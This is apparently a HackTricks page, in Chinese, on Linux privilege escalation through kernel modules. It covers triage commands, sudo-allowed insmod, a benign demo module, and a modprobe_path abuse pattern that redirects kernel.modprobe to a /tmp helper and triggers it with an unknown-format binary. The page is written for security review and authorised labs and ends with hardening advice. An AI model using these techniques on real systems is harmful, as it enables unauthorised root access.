# Kernel Modules and modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## 内核模块和模块加载配置错误

在 Linux 提权审查期间，内核模块支持是一个影响较大的领域。不要仅凭某条 unsigned-module 消息就认定存在可利用性，而应利用它回答以下实际问题：

- 当前用户能否通过 `sudo`、capabilities 或可写的 helper 路径加载模块？
- 模块加载是否仍处于启用状态？
- 模块签名强制执行是否已禁用？
- 模块目录或模块文件是否可写？
- 能否读取内核日志以确认发生了什么？

快速分诊：
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
解释：

- `modules_disabled=1` 表示在重启前无法加载新模块。
- `module_sig_enforce=1` 通常会阻止未签名模块。
- `dmesg_restrict=0` 允许非特权用户在许多系统上读取 kernel logs。
- `/lib/modules/$(uname -r)/` 下的可写路径很危险，因为模块发现和自动加载可能会信任该目录树。

### 加载模块并读取 kernel 输出

如果你拥有加载本地模块的合法权限，`insmod` 会插入你提供的确切 `.ko` 文件。模块的 init 函数会立即运行，使用 `printk()` 写入的消息会出现在 kernel logs 中。

用于 review 或 lab 环境的最小工作流：
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
如果 `sudo -l` 允许执行 `insmod`、`modprobe` 或其包装器，请将其视为严重问题：
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

允许用户运行 `insmod` 的 sudo 规则，不能与允许运行普通管理辅助程序相提并论。`.ko` 被插入后，模块的初始化代码会立即在 kernel context 中运行，因此实际的审查问题是：“该用户能否选择或修改要加载的模块？”

通用审查流程：
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
如果用户可以提供任意 `.ko`，那么在授权评估中应将该规则视为完整系统入侵。更安全的操作模式是避免通过 sudo 委托模块加载；如果无法避免，则应限制确切路径、所有权、权限、签名策略和移除流程。

对于受控实验室中无害的模块构建模式，最小源代码和 Makefile 如下：
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
仅在获得授权的实验室中构建和加载：
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` 控制 kernel 在需要 module-loading assistance 时调用的 userspace helper。如果 attacker 能将其修改为可写的 executable path，并触发 unknown binary format 或其他 module request path，就可能实现 root code execution。

检查当前 helper：
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
检查是否可以影响它：
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
通用的仅限实验室模式：
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
在 hardened systems 上，此操作应失败，因为 unprivileged users 无法写入 `kernel.modprobe`，helper path 不可写，或 module-loading paths 已被阻止。

### 可写的 `/lib/modules` review

可写的 module directories 可能导致 module replacement、malicious module planting，或根据之后调用 `modprobe` 的方式造成 auto-load abuse。

Review writable locations:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
如果发现可写的模块内容，请检查模块是如何被发现的：
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
防御要点：

- 确保 `/lib/modules` 由 `root:root` 所有，并且用户不可写。
- 在实际运行条件允许的情况下，启动后设置 `kernel.modules_disabled=1`。
- 在需要可加载 modules 的系统上强制执行 module signing。
- 监控对 `/proc/sys/kernel/modprobe` 和 `/lib/modules` 的写入，以及异常的 `insmod`/`modprobe` 执行。
